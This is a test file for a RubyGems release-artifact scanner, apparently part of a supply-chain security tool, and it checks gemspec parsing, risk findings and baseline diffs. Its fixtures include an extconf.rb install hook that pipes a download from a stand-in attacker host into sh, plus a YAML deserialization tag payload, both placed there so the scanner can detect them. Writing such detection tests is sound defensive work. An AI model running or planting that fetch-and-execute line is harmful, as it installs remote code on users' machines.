import { describe, expect, test } from "vitest";
import {
  createRubygemsReleaseCandidateReview,
  inferRubygemsArtifactKind,
  isAllowedRubygemsArtifactUrl,
  normalizeRubygemsGemName,
  parseGemspecYaml,
  parseRubygemsReleaseManifest,
  pickRubygemsBaselineRelease,
  rubygemsAdapter,
  selectRubygemsReleaseArtifacts,
  summarizeRubygemsArtifact,
} from "../server/lib/adapters/rubygems/index.ts";
import { rubygemsWorkflowGateAdapter } from "../server/lib/workflow-gates/rubygems.ts";

function file(path, textSample, extra = {}) {
  return {
    path,
    size: textSample.length,
    sha256: `sha-${path}`,
    flags: [],
    textSample,
    ...extra,
  };
}

const adapterCtx = { env: {}, executionCtx: {}, db: {}, session: { userId: "user_1" } };

function gemspec({
  name = "demo-gem",
  version = "1.2.0",
  platform = "ruby",
  executables = [],
  extensions = [],
  dependencies = [],
} = {}) {
  const list = (key, values) =>
    values.length ? `${key}:\n${values.map((value) => `- ${value}`).join("\n")}\n` : `${key}: []\n`;
  const deps = dependencies.length
    ? `dependencies:\n${dependencies
        .map(
          (dep) =>
            `- !ruby/object:Gem::Dependency\n  name: ${dep}\n  requirement: !ruby/object:Gem::Requirement\n    requirements:\n    - - ">="\n      - !ruby/object:Gem::Version\n        version: '0'\n`,
        )
        .join("")}`
    : "dependencies: []\n";
  return (
    `--- !ruby/object:Gem::Specification\n` +
    `name: ${name}\n` +
    `version: !ruby/object:Gem::Version\n  version: ${version}\n` +
    `platform: ${platform}\n` +
    `authors:\n- Demo Author\n` +
    list("executables", executables) +
    list("extensions", extensions) +
    deps
  );
}

function gemFiles({ spec = gemspec(), files = [] } = {}) {
  // Key the gemspec record's sha on its content so version bumps diff as
  // modified even though the path (`metadata.gz`) is identical across releases.
  return [file("metadata.gz", spec, { sha256: `sha-metadata-${spec}` }), ...files];
}

// Network-free RubyGems broker: tests inject the versions listing and a map of
// artifact-url -> parsed files so the baseline download path can be exercised
// without touching rubygems.org or the sandbox loader.
function stubBroker({ versions = null, downloads = {} } = {}) {
  const calls = [];
  return {
    calls,
    broker: {
      async fetchGemVersions() {
        return versions;
      },
      async downloadPublicArtifact(artifact) {
        calls.push(artifact);
        const files = downloads[artifact.url];
        if (!files) throw new Error(`unexpected download for ${artifact.url}`);
        return { files, packageJson: null };
      },
      dispose() {},
    },
  };
}

describe("RubyGems release manifests", () => {
  test("validates manifest shape and artifact kinds", () => {
    const manifest = parseRubygemsReleaseManifest({
      schema: "drydock.release-artifacts.v1",
      ecosystem: "rubygems",
      package: "Demo-Gem",
      version: "1.2.0",
      artifacts: [{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }],
    });

    expect(normalizeRubygemsGemName(manifest.package)).toBe("demo-gem");
    expect(manifest.artifacts[0].kind).toBe("gem");
    expect(inferRubygemsArtifactKind("demo-1.0.0.tar.gz")).toBeNull();
    expect(inferRubygemsArtifactKind("pkg/demo-1.0.0.gem")).toBe("gem");
  });

  test("rejects unsafe manifest artifact paths and non-gem artifacts", () => {
    const base = {
      schema: "drydock.release-artifacts.v1",
      ecosystem: "rubygems",
      package: "demo-gem",
      version: "1.0.0",
    };
    expect(() =>
      parseRubygemsReleaseManifest({
        ...base,
        artifacts: [{ path: "../demo-1.0.0.gem", sha256: "a".repeat(64) }],
      }),
    ).toThrow(/path is not safe/);
    expect(() =>
      parseRubygemsReleaseManifest({
        ...base,
        artifacts: [{ path: "pkg/demo-1.0.0.tar.gz", sha256: "a".repeat(64) }],
      }),
    ).toThrow(/must be a \.gem archive/);
  });
});

describe("gemspec YAML parsing", () => {
  test("reads identity, executables, extensions, and dependency names", () => {
    const summary = parseGemspecYaml(
      gemspec({
        name: "demo-gem",
        version: "2.0.0",
        platform: "x86_64-linux",
        executables: ["demo"],
        extensions: ["ext/demo/extconf.rb"],
        dependencies: ["rake"],
      }),
    );
    expect(summary).toEqual({
      name: "demo-gem",
      version: "2.0.0",
      platform: "x86_64-linux",
      executables: ["demo"],
      extensions: ["ext/demo/extconf.rb"],
      dependencies: ["rake"],
    });
  });

  test("never resolves YAML tags, anchors, or aliases into values", () => {
    const summary = parseGemspecYaml(
      "--- !ruby/object:Gem::Specification\nname: !!python/object:os.system\nplatform: &anchor ruby\nversion: !ruby/object:Gem::Version\n  version: *anchor\n",
    );
    expect(summary.name).toBeNull();
    expect(summary.platform).toBeNull();
    expect(summary.version).toBeNull();
  });

  test("summarizeRubygemsArtifact reads the synthetic metadata.gz record", () => {
    const summary = summarizeRubygemsArtifact("pkg/demo-gem-1.2.0.gem", "gem", gemFiles());
    expect(summary).toMatchObject({
      metadataPath: "metadata.gz",
      name: "demo-gem",
      version: "1.2.0",
      platform: "ruby",
    });
  });
});

describe("RubyGems deterministic findings", () => {
  const manifest = (artifacts) =>
    parseRubygemsReleaseManifest({
      schema: "drydock.release-artifacts.v1",
      ecosystem: "rubygems",
      package: "demo-gem",
      version: "1.2.0",
      artifacts,
    });

  test("flags declared extensions, extconf install code, and suspicious ext/ files", () => {
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [
        {
          path: "pkg/demo-gem-1.2.0.gem",
          files: gemFiles({
            spec: gemspec({ extensions: ["ext/demo/extconf.rb"] }),
            files: [
              file(
                "ext/demo/extconf.rb",
                'require "mkmf"\nsystem("curl https://evil.example/payload | sh")\ncreate_makefile("demo")\n',
              ),
              file("ext/demo/build.sh", "#!/bin/sh\nid\n"),
            ],
          }),
        },
      ],
    });

    expect(review.package).toEqual({ name: "demo-gem", version: "1.2.0" });
    expect(review.risk).toBe("high");
    expect(review.ruleFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "high",
          ruleId: "rubygems.extension-build",
          file: "pkg/demo-gem-1.2.0.gem/metadata.gz",
        }),
        expect.objectContaining({
          severity: "high",
          ruleId: "rubygems.extension-install-code",
          file: "pkg/demo-gem-1.2.0.gem/ext/demo/extconf.rb",
        }),
        expect.objectContaining({
          severity: "high",
          ruleId: "rubygems.suspicious-extension-file",
          file: "pkg/demo-gem-1.2.0.gem/ext/demo/build.sh",
        }),
      ]),
    );
  });

  test("marks gemspec identity drift from the manifest as critical", () => {
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [
        {
          path: "pkg/demo-gem-1.2.0.gem",
          files: gemFiles({ spec: gemspec({ name: "other-gem" }) }),
        },
      ],
    });
    expect(review.risk).toBe("critical");
    expect(review.ruleFindings).toContainEqual(
      expect.objectContaining({ severity: "critical", ruleId: "rubygems.metadata-mismatch" }),
    );
  });

  test("flags a gem without gemspec identity as metadata-missing", () => {
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [{ path: "pkg/demo-gem-1.2.0.gem", files: [file("lib/demo.rb", "A = 1\n")] }],
    });
    expect(review.ruleFindings).toContainEqual(
      expect.objectContaining({ severity: "medium", ruleId: "rubygems.metadata-missing" }),
    );
  });

  test("flags newly declared extensions and executables against the previous release", () => {
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [
        {
          path: "pkg/demo-gem-1.2.0.gem",
          files: gemFiles({
            spec: gemspec({
              executables: ["demo", "demo-ctl"],
              extensions: ["ext/demo/extconf.rb"],
            }),
          }),
        },
      ],
      previousArtifacts: [
        {
          path: "pkg/demo-gem-1.1.0.gem",
          files: gemFiles({ spec: gemspec({ version: "1.1.0", executables: ["demo"] }) }),
        },
      ],
    });

    expect(review.ruleFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ severity: "high", ruleId: "rubygems.extension-added" }),
        expect.objectContaining({
          severity: "medium",
          ruleId: "rubygems.executable-added",
          evidence: expect.stringContaining("demo-ctl"),
        }),
      ]),
    );
    expect(
      review.ruleFindings.filter((finding) => finding.ruleId === "rubygems.executable-added"),
    ).toHaveLength(1);
  });

  test("flags git-sourced gemspec dependencies and packaged native binaries", () => {
    const spec =
      gemspec() +
      `- !ruby/object:Gem::Dependency\n  name: sneaky\n  git: https://evil.example/sneaky.git\n`;
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [
        {
          path: "pkg/demo-gem-1.2.0.gem",
          files: gemFiles({
            spec,
            files: [file("lib/demo/native.so", "\u0000binary")],
          }),
        },
      ],
    });
    expect(review.ruleFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ severity: "high", ruleId: "rubygems.git-dependency" }),
        expect.objectContaining({
          severity: "high",
          ruleId: "rubygems.native-artifact",
          file: "pkg/demo-gem-1.2.0.gem/lib/demo/native.so",
        }),
      ]),
    );
  });

  test("surfaces content-skipped tar entries as findings instead of dropping them", () => {
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [
        {
          path: "pkg/demo-gem-1.2.0.gem",
          files: gemFiles(),
          suspiciousEntries: [
            {
              kind: "content-skipped",
              path: "lib/huge.bin",
              detail: "file body exceeds the per-file inspection limit",
            },
          ],
        },
      ],
    });
    expect(review.ruleFindings).toContainEqual(
      expect.objectContaining({
        ruleId: "tar.suspicious-entry",
        file: "pkg/demo-gem-1.2.0.gem/lib/huge.bin",
      }),
    );
  });

  test("a clean gem produces no findings", () => {
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [
        {
          path: "pkg/demo-gem-1.2.0.gem",
          files: gemFiles({ files: [file("lib/demo.rb", "module Demo\n  A = 1\nend\n")] }),
        },
      ],
    });
    expect(review.ruleFindings).toEqual([]);
    expect(review.risk).toBe("low");
  });

  test("requires reviewed artifacts to exactly match the manifest", () => {
    expect(() =>
      createRubygemsReleaseCandidateReview({
        manifest: manifest([
          { path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) },
          { path: "pkg/demo-gem-1.2.0-x86_64-linux.gem", sha256: "b".repeat(64) },
        ]),
        artifacts: [{ path: "pkg/demo-gem-1.2.0.gem", files: gemFiles() }],
      }),
    ).toThrow(/exactly match manifest artifacts/);
  });

  test("compares gems through stable platform namespaces across versions", () => {
    const review = createRubygemsReleaseCandidateReview({
      manifest: manifest([{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }]),
      artifacts: [
        {
          path: "pkg/demo-gem-1.2.0.gem",
          files: gemFiles({
            files: [file("lib/demo.rb", "A = 1\n", { sha256: "sha-shared" })],
          }),
        },
      ],
      previousArtifacts: [
        {
          path: "pkg/demo-gem-1.1.0.gem",
          files: gemFiles({
            spec: gemspec({ version: "1.1.0" }),
            files: [file("lib/demo.rb", "A = 1\n", { sha256: "sha-shared" })],
          }),
        },
      ],
    });

    expect(review.diff).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ path: "gem/ruby/lib/demo.rb", status: "unchanged" }),
        expect.objectContaining({ path: "gem/ruby/metadata.gz", status: "modified" }),
      ]),
    );
    expect(review.diff.some((entry) => entry.path.includes("demo-gem-1.2.0.gem"))).toBe(false);
  });
});

describe("RubyGems provenance", () => {
  test("summarizeDetails surfaces reviewed gem digests as a provenance block", async () => {
    const input = rubygemsAdapter.parseInput({
      manifest: {
        schema: "drydock.release-artifacts.v1",
        ecosystem: "rubygems",
        package: "demo-gem",
        version: "1.2.0",
        artifacts: [
          { path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) },
          { path: "pkg/demo-gem-1.2.0-x86_64-linux.gem", sha256: "b".repeat(64) },
        ],
      },
      artifacts: [
        { path: "pkg/demo-gem-1.2.0.gem", files: gemFiles() },
        {
          path: "pkg/demo-gem-1.2.0-x86_64-linux.gem",
          files: gemFiles({ spec: gemspec({ platform: "x86_64-linux" }) }),
        },
      ],
    });
    const staged = await rubygemsAdapter.acquireStaged(adapterCtx, input, stubBroker().broker);
    expect(rubygemsAdapter.summarizeDetails(staged.details).provenance).toEqual({
      ecosystem: "rubygems",
      mode: "workflow_gate",
      artifacts: [
        { path: "pkg/demo-gem-1.2.0.gem", kind: "gem", sha256: "a".repeat(64) },
        { path: "pkg/demo-gem-1.2.0-x86_64-linux.gem", kind: "gem", sha256: "b".repeat(64) },
      ],
    });
  });
});

describe("RubyGems registry metadata helpers", () => {
  const versions = [
    {
      number: "1.1.0",
      platform: "ruby",
      created_at: "2026-02-01T00:00:00.000Z",
      sha: "c".repeat(64),
    },
    {
      number: "1.1.0",
      platform: "x86_64-linux",
      created_at: "2026-02-01T00:00:00.000Z",
      sha: "d".repeat(64),
    },
    { number: "1.0.0", platform: "ruby", created_at: "2026-01-01T00:00:00.000Z" },
    {
      number: "1.2.0.rc1",
      platform: "ruby",
      created_at: "2026-03-01T00:00:00.000Z",
      prerelease: true,
    },
  ];

  test("picks the newest stable published release as the default baseline", () => {
    expect(pickRubygemsBaselineRelease(versions, "1.2.0")).toEqual({
      version: "1.1.0",
      source: "latest-published",
      reason: "newest-stable-release",
    });
  });

  test("excludes the candidate itself and falls back to prereleases only when no stable exists", () => {
    expect(pickRubygemsBaselineRelease(versions, "1.1.0")).toMatchObject({ version: "1.0.0" });
    expect(
      pickRubygemsBaselineRelease(
        [{ number: "1.0.0.beta1", created_at: "2026-01-01T00:00:00.000Z", prerelease: true }],
        "1.0.0",
      ),
    ).toEqual({ version: "1.0.0.beta1", source: "upload-time", reason: "newest-prerelease" });
    expect(pickRubygemsBaselineRelease([], "1.0.0")).toEqual({
      version: null,
      source: "none",
      reason: "no-published-baseline",
    });
  });

  test("selects per-platform download URLs for the baseline version", () => {
    expect(selectRubygemsReleaseArtifacts(versions, "demo-gem", "1.1.0")).toEqual([
      {
        filename: "demo-gem-1.1.0.gem",
        url: "https://rubygems.org/gems/demo-gem-1.1.0.gem",
        sha256: "c".repeat(64),
        platform: "ruby",
        kind: "gem",
      },
      {
        filename: "demo-gem-1.1.0-x86_64-linux.gem",
        url: "https://rubygems.org/gems/demo-gem-1.1.0-x86_64-linux.gem",
        sha256: "d".repeat(64),
        platform: "x86_64-linux",
        kind: "gem",
      },
    ]);
  });

  test("allows only rubygems.org gem download URLs for public baseline fetches", () => {
    expect(isAllowedRubygemsArtifactUrl("https://rubygems.org/gems/demo-1.0.0.gem")).toBe(true);
    expect(isAllowedRubygemsArtifactUrl("https://evil.example/gems/demo-1.0.0.gem")).toBe(false);
    expect(isAllowedRubygemsArtifactUrl("http://rubygems.org/gems/demo-1.0.0.gem")).toBe(false);
    expect(isAllowedRubygemsArtifactUrl("https://rubygems.org/api/v1/gems/demo.json")).toBe(false);
  });
});

describe("RubyGems baseline acquisition through the broker", () => {
  const manifest = parseRubygemsReleaseManifest({
    schema: "drydock.release-artifacts.v1",
    ecosystem: "rubygems",
    package: "demo-gem",
    version: "1.2.0",
    artifacts: [{ path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64) }],
  });

  test("downloads the selected previous release and namespaces baseline files for diffing", async () => {
    const gemUrl = "https://rubygems.org/gems/demo-gem-1.1.0.gem";
    const input = rubygemsAdapter.parseInput({
      manifest,
      artifacts: [{ path: "pkg/demo-gem-1.2.0.gem", files: gemFiles() }],
    });
    const { broker, calls } = stubBroker({
      versions: [{ number: "1.1.0", platform: "ruby", created_at: "2026-02-01T00:00:00.000Z" }],
      downloads: { [gemUrl]: gemFiles({ spec: gemspec({ version: "1.1.0" }) }) },
    });

    const staged = await rubygemsAdapter.acquireStaged(adapterCtx, input, broker);
    const baseline = await rubygemsAdapter.acquireBaseline(adapterCtx, input, broker, staged);

    expect(calls).toEqual([{ url: gemUrl }]);
    expect(baseline.baseline).toMatchObject({
      version: "1.1.0",
      source: "latest-published",
      reason: "newest-stable-release",
    });
    expect(baseline.artifact.files.every((entry) => entry.path.startsWith("gem/ruby/"))).toBe(true);
  });

  test("only downloads platforms that are actually staged", async () => {
    const gemUrl = "https://rubygems.org/gems/demo-gem-1.1.0.gem";
    const input = rubygemsAdapter.parseInput({
      manifest,
      artifacts: [{ path: "pkg/demo-gem-1.2.0.gem", files: gemFiles() }],
    });
    const { broker, calls } = stubBroker({
      versions: [
        { number: "1.1.0", platform: "ruby", created_at: "2026-02-01T00:00:00.000Z" },
        { number: "1.1.0", platform: "x86_64-linux", created_at: "2026-02-01T00:00:00.000Z" },
      ],
      downloads: { [gemUrl]: gemFiles({ spec: gemspec({ version: "1.1.0" }) }) },
    });

    const staged = await rubygemsAdapter.acquireStaged(adapterCtx, input, broker);
    await rubygemsAdapter.acquireBaseline(adapterCtx, input, broker, staged);

    expect(calls).toEqual([{ url: gemUrl }]);
  });

  test("runs without a baseline when no versions listing is available", async () => {
    const input = rubygemsAdapter.parseInput({
      manifest,
      artifacts: [{ path: "pkg/demo-gem-1.2.0.gem", files: gemFiles() }],
    });
    const { broker, calls } = stubBroker({ versions: null });
    const staged = await rubygemsAdapter.acquireStaged(adapterCtx, input, broker);
    const baseline = await rubygemsAdapter.acquireBaseline(adapterCtx, input, broker, staged);

    expect(calls).toHaveLength(0);
    expect(baseline.artifact).toBeNull();
    expect(baseline.baseline).toMatchObject({
      version: null,
      source: "none",
      reason: "metadata-unavailable",
    });
  });
});

describe("RubyGems workflow-gate adapter", () => {
  const parsed = (path, files, extra = {}) => ({
    path,
    sha256: "a".repeat(64),
    ecosystem: "rubygems",
    kind: "gem",
    files,
    packageJson: null,
    ...extra,
  });

  test("classifies and content-detects gem artifacts", () => {
    expect(rubygemsWorkflowGateAdapter.classifyArtifact("pkg/demo-1.0.0.gem")).toBe("gem");
    expect(rubygemsWorkflowGateAdapter.classifyArtifact("pkg/SHA256SUMS")).toBeNull();
    expect(rubygemsWorkflowGateAdapter.classifyArtifact("pkg/demo-1.0.0.tar.gz")).toBeNull();
    expect(
      rubygemsWorkflowGateAdapter.detectArtifact({ files: gemFiles(), packageJson: null }),
    ).toBe("gem");
    expect(
      rubygemsWorkflowGateAdapter.detectArtifact({
        files: [file("metadata.gz", "not a gemspec")],
        packageJson: null,
      }),
    ).toBeNull();
  });

  test("groups platform gems into one candidate per gem name", () => {
    const candidates = rubygemsWorkflowGateAdapter.prepareReleaseCandidates([
      parsed("pkg/demo-gem-1.2.0.gem", gemFiles()),
      parsed(
        "pkg/demo-gem-1.2.0-x86_64-linux.gem",
        gemFiles({ spec: gemspec({ platform: "x86_64-linux" }) }),
        { sha256: "b".repeat(64) },
      ),
      parsed(
        "pkg/other-gem-0.1.0.gem",
        gemFiles({ spec: gemspec({ name: "other-gem", version: "0.1.0" }) }),
      ),
    ]);

    expect(candidates.map((candidate) => candidate.package)).toEqual([
      { name: "demo-gem", version: "1.2.0" },
      { name: "other-gem", version: "0.1.0" },
    ]);
    expect(candidates[0].ecosystem).toBe("rubygems");
    expect(candidates[0].pipelineInput.manifest.artifacts).toEqual([
      { path: "pkg/demo-gem-1.2.0.gem", sha256: "a".repeat(64), url: undefined, kind: "gem" },
      {
        path: "pkg/demo-gem-1.2.0-x86_64-linux.gem",
        sha256: "b".repeat(64),
        url: undefined,
        kind: "gem",
      },
    ]);
  });

  test("fails closed on missing identity, version skew, and duplicate platforms", () => {
    expect(() =>
      rubygemsWorkflowGateAdapter.prepareReleaseCandidates([
        parsed("pkg/mystery.gem", [file("lib/demo.rb", "A = 1\n")]),
      ]),
    ).toThrow(/does not expose a gemspec name\/version/);

    expect(() =>
      rubygemsWorkflowGateAdapter.prepareReleaseCandidates([
        parsed("pkg/demo-gem-1.2.0.gem", gemFiles()),
        parsed("pkg/demo-gem-1.3.0.gem", gemFiles({ spec: gemspec({ version: "1.3.0" }) })),
      ]),
    ).toThrow(/disagrees with/);

    expect(() =>
      rubygemsWorkflowGateAdapter.prepareReleaseCandidates([
        parsed("pkg/demo-gem-1.2.0.gem", gemFiles()),
        parsed("pkg/demo-gem-copy.gem", gemFiles()),
      ]),
    ).toThrow(/duplicates platform/);
  });
});
